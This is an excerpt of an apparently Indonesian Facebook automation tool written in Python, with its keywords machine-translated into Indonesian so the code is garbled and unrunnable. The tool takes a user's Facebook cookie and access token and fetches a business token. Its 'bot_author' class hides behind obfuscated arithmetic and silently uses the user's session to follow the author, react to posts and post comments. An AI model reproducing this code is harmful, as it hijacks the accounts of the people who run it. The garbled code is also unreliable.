...
Penulis = 'Dapunta Khurayra X'
Facebook = 'Facebook.com/MastaBeen'
Instagram = 'Instagram.com/Rchyan552'
Whatsapp = '+1 (406) 637-6843'
YouTube = 'https://youtube.com/channel/UCXXbwNQeKXlF64Okz43H8ww'
Versi = '0.6'
Denventa = 1827084332
Postingan = 10217173381366429

###----------[ IMPOR PERPUSTAKAAN ]---------- ###
permintaan impor,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
dari randint impor acak
dari bersamaan.futures mengimpor ThreadPoolExecutor
dari bs4 impor BeautifulSoup sebagai par
dari tanggal impor datetime
dari datetime impor datetime
dari cetakan impor yang kaya sebagai printer
dari rich.panel import Panel
...
ua_iphone = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Versi/2.1 Seluler/15E148 Safari/604.1'
...
mencoba:
    jika bulan < 0 atau bulan > 12:
        KELUAR()
    bulan_skrn = bulan - 1
kecuali ValueError:
    KELUAR()
Nama kode = 159357
CoY = ('\r %s[%s•%s] %sMerecode Dilarang Keras %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrn]
...
SAKERA = Nama Kode + len(Penulis) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Penulis) + Nama Kode
sakira = len(Facebook) + Nama Kode
sakura = len(Instagram) + Nama Kode
sakera = len(Whatsapp) + Nama Kode
sakora = len(YouTube) + Nama Kode
ip_log = Denventa * id_dev - 3654168663

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/ 537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###-----------[ PROXY INDONESIA & LUAR ]---------- ###
def prox_prox():
    buka('alat/proksi.json','w').tulis('')
    dengan request.Session() sebagai xyz:
        mencoba:
            req = xyz.get('https://spys.me/socks.txt').text
            untuk x di req.splitlines():
                jika '+' di x:
                    jika '.' di x:
                        prox = x.split(' ')[0]
                        buka('tool/proxy.json','a+').write('%s\n'%(prox))
...
bahasa def (kuki):
    mencoba:
        dengan request.Session() sebagai xyz:
            ...
            untuk x di pra.find_all('form',{'method':'post'}):
                jika 'Bahasa Indonesia' di str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "kirim" : "Bahasa Indonesia"
                        }
...
def kecuali(kesalahan):
    ...
    print(' %s• %sCookie/Token Tidak Valid'%(M,A))
    print(' %s• %sSalah Memasukkan ID'%(M,A))
    print(' %s• %sBug Pada Source Code'%(M,A))
    print(' %s• %sPermintaan Bug Pada'%(M,A))
...
kelas bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        ...
        untuk x di list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        dengan request.Session() sebagai xyz:
            mencoba:
                jika ip_log != 1:pass
                kalau tidak:
                    untuk x di par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href= BENAR):
                        jika 'berlangganan.php' di x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            kecuali Pengecualian sebagai e:pass
        ...
        dengan request.Session() sebagai xyz:
            mencoba:
                ...
                kalau tidak:
                    ...
                    untuk x di bos.find_all('a',href=True):
                        jika 'Tanggapi' di x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            untuk z di par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a '):
    ...
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        dengan request.Session() sebagai xyz:
            mencoba:
                untuk x di xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    jika ip_log != 1:pass
                    kalau tidak:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu( )))
                        dapatkan = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies= kue).teks)
                        jika 'error' di get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit (tampilan_menu())
            kecuali Pengecualian sebagai e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember" ][datetime.now().month - 1]
        _hari_ = {'Minggu':'Minggu','Senin':'Senin','Selasa':'Selasa','Rabu':'Rabu','Kamis':'Kamis','Jumat':'Jumat' ,'Sabtu':'Sabtu'}[str(datetime.now().strftime("%A"))]
...
def clotox (kue):
    dengan request.Session() sebagai xyz:
        get_tok = xyz.get(url_businness+'/business_locations',header = {
            "agen-pengguna":ua_business,
            "perujuk": web_fb,
            "host": "bisnis.facebook.com",
            "asal": url_bisnis,
